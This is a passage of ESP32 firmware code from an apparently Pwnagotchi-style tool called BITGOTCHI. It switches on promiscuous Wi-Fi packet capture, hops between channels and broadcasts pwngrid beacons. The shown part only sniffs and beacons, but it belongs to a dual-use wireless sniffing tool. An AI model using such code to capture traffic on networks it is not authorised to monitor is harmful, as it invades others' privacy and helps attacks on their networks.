        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb(promisc_cb);
        esp_wifi_set_channel(bitgotchi_channels[0], WIFI_SECOND_CHAN_NONE);
        Serial.println("[BITGOTCHI] Started");
    }

    if (flag_bitgotchi_stop) {
        flag_bitgotchi_stop = false;
        bitgotchi_active = false;
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(nullptr);
        snprintf(bitgotchi_last_event, sizeof(bitgotchi_last_event), "Stopped.");
        Serial.println("[BITGOTCHI] Stopped");
    }

    if (bitgotchi_active) {
        uint32_t now = millis();
        
        if (now - bitgotchi_hop_ms > 300) {
            bitgotchi_hop_ms = now;
            bitgotchi_ch_idx = (bitgotchi_ch_idx + 1) % 3;
            esp_wifi_set_channel(bitgotchi_channels[bitgotchi_ch_idx], WIFI_SECOND_CHAN_NONE);
            snprintf(bitgotchi_last_event, sizeof(bitgotchi_last_event), "Scanning Ch:%d",
                     bitgotchi_channels[bitgotchi_ch_idx]);
            bitgotchi_new_event = true;
        }
        
        if (now - bitgotchi_beacon_ms > 5000) {
            bitgotchi_beacon_ms = now;
            bitgotchi_send_pwngrid_beacon();
            snprintf(bitgotchi_last_event, sizeof(bitgotchi_last_event), "Broadcasting Beacon...");
            bitgotchi_new_event = true;
        }
    }
}
